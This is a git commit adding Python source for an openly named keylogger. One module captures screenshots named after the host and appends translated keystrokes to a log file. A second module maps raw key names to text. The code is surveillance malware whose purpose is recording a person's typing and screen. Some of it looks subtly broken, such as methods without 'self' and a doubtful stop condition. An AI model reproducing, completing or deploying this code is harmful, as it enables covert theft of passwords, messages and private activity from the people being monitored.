504f30e1454050b7d9b1d310434cc10712555533
Cristian <adrian.cristian.st@gmail.com>
2023-10-01 19:27:30 -0300

    adicionado screenshot e nova classe de funcoes

---
+++ functions/keyloggerFn.py
@@ -0,0 +1,35 @@
+import os, socket, pyautogui
+
+from pynput.keyboard import Key
+from functions import translateKeys
+
+logFile = 'logs/log.txt'
+
+class keylogger:
+    def __init__(self):
+        pass
+
+    def screenshot(self):
+        file = f'{socket.gethostname()}.png'
+        if not os.path.exists(file):
+            pyautogui.screenshot().save(file)
+            pyautogui.screenshot().close()
+            
+        pyautogui.screenshot().save(file)
+        pyautogui.screenshot().close()
+        
+
+
+    def writeLog(key):
+        keydata = str(key).replace("'", "") 
+        tKeys = translateKeys.rtrnKeys()
+       
+        for key in tKeys:
+            keydata = keydata.replace(key, tKeys[key])
+
+        with open(logFile, "a") as l:
+            l.write(keydata)
+            
+    def stopKeyLogger(key):
+        if key == Key.esc and Key.f2:
+            return False
---
+++ functions/translateKeys.py
@@ -0,0 +1,28 @@
+translate_keys = {
+    "space": " ",
+    "back": "",
+    "alt_l": "",
+    "enter": "",
+    
+    "Key.": "",
+    "Key.shift_r": "",
+    "Key.shift_l": "",
+    "Key.shift": "",
+    "Key.alt": "",
+    "Key.esc": "",
+    "Key.cmd": "",
+    "Key.caps_lock": "",
+    "Key.ctrl_l\x1a": 'CTRL-Z',
+    "Key.ctrl_l": "",
+    "Key.tab": "",
+    
+    "\x1a": "",
+
+    "ctrl":   "",
+    "ctrl_l": "",
+    "ctrl_r": "",
+    "ctrl\x13": " ",
+}
+
+def rtrnKeys():
+    return translate_keys
